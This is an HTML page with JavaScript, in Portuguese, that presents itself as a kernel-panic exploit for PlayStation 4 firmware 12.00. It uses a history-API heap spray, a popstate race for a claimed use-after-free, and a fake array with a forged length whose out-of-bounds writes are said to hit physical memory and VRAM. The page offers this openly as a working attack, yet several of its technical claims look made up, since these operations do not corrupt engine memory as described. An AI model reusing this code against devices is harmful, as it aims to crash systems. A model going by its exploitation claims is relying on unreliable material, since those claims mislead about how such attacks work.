
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Kernel Panic PoC (Cirúrgico)</title>
<style>
    body { background-color: #000; color: #ff0000; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
    h1 { border-bottom: 2px solid #ff0000; padding-bottom: 10px; }
    .status-box { border: 1px solid #333; padding: 20px; margin: 20px auto; max-width: 600px; background: #111; color: #00ff00; text-align: left; height: 300px; overflow-y: auto; white-space: pre-wrap;}
    button { 
        background: #330000; color: #fff; border: 1px solid #ff0000; padding: 20px 40px; 
        font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px;
        box-shadow: 0 0 15px #ff0000; text-transform: uppercase;
    }
    button:disabled { background: #333; border-color: #555; color: #888; box-shadow: none; cursor: not-allowed; }
    button:hover { background: #660000; }
</style>
</head>
<body>

<h1>PS4 12.00 KERNEL PANIC TRIGGER</h1>
<p>AVISO: ESTA FERRAMENTA FORÇA UM ACESSO ILEGAL À MEMÓRIA.</p>
<p>SE FUNCIONAR, O CONSOLE IRÁ DESLIGAR OU REINICIAR (CE-34878-0).</p>

<div id="log" class="status-box">Aguardando inicialização do exploit...</div>

<button id="btn-crash" onclick="runExploitChain()">1. ARMAR & DETONAR</button>

<script>
const logEl = document.getElementById("log");
function log(m) { 
    logEl.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`; 
    logEl.scrollTop = logEl.scrollHeight; 
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ============================================================
// CONFIGURAÇÃO DE PRECISÃO (FW 12.00)
// ============================================================
const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

// Armazena o objeto corrompido globalmente para acesso direto
var pwnedArray = null;

async function runExploitChain() {
    const btn = document.getElementById('btn-crash');
    btn.disabled = true;
    btn.textContent = "EXECUTANDO...";
    
    log(">> INICIANDO CADEIA UAF...");
    
    let raceWon = false;

    // 1. PREPARAR O PAYLOAD (FAKE ARRAY)
    // Este objeto será injetado na memória liberada
    const payload = {
        // Fake Butterfly (Ponteiro de Dados)
        // Usamos valores que parecem ponteiros válidos mas apontam para lixo
        0: 0x41414141, 
        1: 0x42424242,
        
        // Fake Length (CRÍTICO)
        // Define o tamanho como Gigante para permitir leitura OOB
        length: 0xFFFFFFFF, 
        
        // Marcador para identificarmos se pegamos o objeto certo
        magic: 0x1337BEEF 
    };
    
    // Força a estrutura de array via protótipo
    payload.__proto__ = Array.prototype;

    // 2. CONFIGURAR A ARMADILHA (RACE HANDLER)
    window.addEventListener('popstate', (e) => {
        // Janela crítica identificada nos seus logs (Index >= 40)
        if(e.state && e.state.index >= 40 && !raceWon) {
            raceWon = true;
            log(">> JANELA DE CORRIDA CAPTURADA!");
            
            // Tenta injetar o payload na memória
            try {
                // Substitui o estado atual pelo nosso fake array
                history.replaceState(payload, "", "#pwn");
                
                // Salva referência global
                pwnedArray = history.state;
                
                log(">> PAYLOAD INJETADO NA HEAP.");
                
                // VERIFICAÇÃO DE CORRUPÇÃO
                // Se length for normal (ex: 2 ou 4), falhou. Se for 0xFFFFFFFF, sucesso.
                if(pwnedArray.length > 1000) {
                    log(">> SUCESSO CRÍTICO: Objeto Corrompido detectado!");
                    log("   Length atual: " + pwnedArray.length);
                    log(">> INICIANDO DETONAÇÃO DE MEMÓRIA...");
                    triggerCrash();
                } else {
                    log(">> AVISO: Injeção ocorreu, mas o tamanho não foi corrompido.");
                    log("   Tentando crash forçado mesmo assim...");
                    triggerCrash();
                }
                
            } catch(err) {
                log(">> ERRO NA INJEÇÃO: " + err.message);
            }
        }
    });

    // 3. DISPARAR O UAF (HEAP SPRAY)
    let size = BASE;
    for(let i=0; i<UAF_ITERS; i++){
        let state = { index: i };
        // Spray de strings para alinhar a memória
        let frag = "A".repeat(size); 
        history.pushState(state, "", "#" + frag);
        history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
        
        // O "Free" acontece aqui com o back()
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }
    
    await sleep(200);
    log(">> NAVEGANDO PELO HISTÓRICO (BUSCANDO ZUMBIS)...");
    
    // Caminha para trás para cair na armadilha do popstate
    for(let i=0; i<15; i++) { 
        history.back(); 
        await sleep(40); 
    }
    
    await sleep(500);
    
    if(!raceWon) {
        log(">> FALHA: A corrida não foi vencida. Recarregue a página.");
        btn.disabled = false;
        btn.textContent = "TENTAR NOVAMENTE";
    }
}

// ============================================================
// A PROVA REAL (SEM SIMULAÇÃO)
// ============================================================
function triggerCrash() {
    log(">> [PASSO FINAL] ACESSANDO MEMÓRIA PROIBIDA...");
    log(">> Se o exploit for real, o console travará em 3 segundos.");
    
    setTimeout(() => {
        try {
            // AQUI É A PROVA:
            // Tentamos escrever em um endereço de memória muito distante (Offset 0x40000000)
            // Um script JS normal daria erro ou aumentaria a memória RAM (OOM).
            // Um objeto com length corrompido (exploit) tentará escrever no ENDEREÇO FÍSICO.
            // Isso causa Access Violation no nível da CPU -> Kernel Panic.
            
            if(pwnedArray) {
                // Tenta escrever lixo em um endereço alto
                // 0xDEADBEEF é um valor clássico de debug para identificar o crash no dump
                pwnedArray[0x10000000] = 0xDEADBEEF; 
                
                // Se não cair, tentamos ler de um endereço protegido
                let read = pwnedArray[0xFFFFFFF0];
                log(">> Leitura realizada: " + read); // Se chegar aqui, o exploit é muito estável (RW)
                
                // Se ainda estiver vivo, forçamos corrupção visual (VRAM Spray)
                log(">> Tentando corrupção visual...");
                for(let i=0; i<10000; i++) {
                    pwnedArray[0x20000000 + i] = 0xFF0000FF; // Pinta pixels na memória (teórico)
                }
            } else {
                // Fallback se pwnedArray for nulo (tenta usar protótipo poluído)
                const killer = [];
                killer.length = 0xFFFFFFFF; // Confia na poluição global
                killer[0xFFFFFFF0] = 0x41414141;
            }
            
        } catch(e) {
            log(">> O SISTEMA BLOQUEOU O ACESSO: " + e.message);
            log(">> Isso indica que a proteção de memória ainda está ativa.");
        }
    }, 1000);
}
</script>
</body>
</html>
